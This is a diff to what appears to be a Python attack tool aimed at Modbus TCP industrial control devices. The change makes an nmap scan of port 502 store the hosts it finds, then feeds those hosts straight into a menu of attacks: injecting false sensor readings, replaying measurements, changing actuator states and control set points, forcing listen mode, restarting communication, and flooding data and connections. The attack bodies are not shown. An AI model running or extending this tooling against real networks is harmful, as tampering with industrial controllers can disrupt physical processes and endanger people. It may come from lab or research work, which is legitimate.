@@ -23,6 +23,8 @@ LOGO = r"""
                                                    |__/                                                                                             
 """
 
+# globals
+scanned_ips = [] # is filled with all modbus ips if the first attacks is executed
 
 
 # CLASS:    CustomModbusRequest
@@ -56,6 +58,8 @@ def create_custom_request(fc):
 #           scan identifies hosts running with port 502 open, as this port is used for Modbus
 #           TCP communication.
 def address_scan(ip_CIDR):
+    global scanned_ips
+
     print("### ADDRESS SCAN ###")
     print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")
 
@@ -68,7 +72,7 @@ def address_scan(ip_CIDR):
 
     # print scan results
     for host in nm.all_hosts():
-        print("--------------------------------------------")
+        print("--------------------------------------------")        
         print(f"Host: {host} ({nm[host].hostname()})")
         print(f"Host State: {nm[host].state()}")
         for proto in nm[host].all_protocols():
@@ -81,6 +85,7 @@ def address_scan(ip_CIDR):
                 if nm[host][proto][port]['state'] == "open":
                     print("\tModbus port 502 is open.")
                     print("It is likely this host is a Modbus Client")
+                    scanned_ips.append(nm[host]['addresses']['ipv4'])
 
     print("### ADDRESS SCAN FINISH ###")
 
@@ -350,30 +355,34 @@ if __name__ == "__main__":
         except ValueError:
             pass
 
+        # check if any ips have been scanned
+        if len(scanned_ips) == 0:
+            print("Warning: No IPs scanned. Run an address scan to find Modbus clients")
+
         # perform cyber attack
         if selection == 0:
             address_scan("192.168.0.0/24")
         elif selection == 1:
-            function_code_scan(["192.168.0.21", "192.168.0.22"])
+            function_code_scan(scanned_ips)
         elif selection == 2:
-            device_identification_attack(["192.168.0.21", "192.168.0.22"])
+            device_identification_attack(scanned_ips)
         elif selection == 3:
-            naive_sensor_read(["192.168.0.21", "192.168.0.22"])
+            naive_sensor_read(scanned_ips)
         elif selection == 4:
-            sporadic_sensor_measurement_injection(["192.168.0.21", "192.168.0.22"])
+            sporadic_sensor_measurement_injection(scanned_ips)
         elif selection == 5:
-            calculated_sensor_measure_injection(["192.168.0.21", "192.168.0.22"])
+            calculated_sensor_measure_injection(scanned_ips)
         elif selection == 6:
-            replayed_measurement_injection(["192.168.0.21", "192.168.0.22"])
+            replayed_measurement_injection(scanned_ips)
         elif selection == 7:
-            altered_actuator_state(["192.168.0.21", "192.168.0.22"])
+            altered_actuator_state(scanned_ips)
         elif selection == 8:
-            altered_control_set_points(["192.168.0.21", "192.168.0.22"])
+            altered_control_set_points(scanned_ips)
         elif selection == 9:
-            force_listen_mode(["192.168.0.21", "192.168.0.22"])
+            force_listen_mode(scanned_ips)
         elif selection == 10:
-            restart_communication(["192.168.0.21", "192.168.0.22"])
+            restart_communication(scanned_ips)
         elif selection == 11:
-            data_flood_attack(["192.168.0.21", "192.168.0.22"])
+            data_flood_attack(scanned_ips)
         elif selection == 12:
-            connection_flood_attack(["192.168.0.21", "192.168.0.22"])
+            connection_flood_attack(scanned_ips)
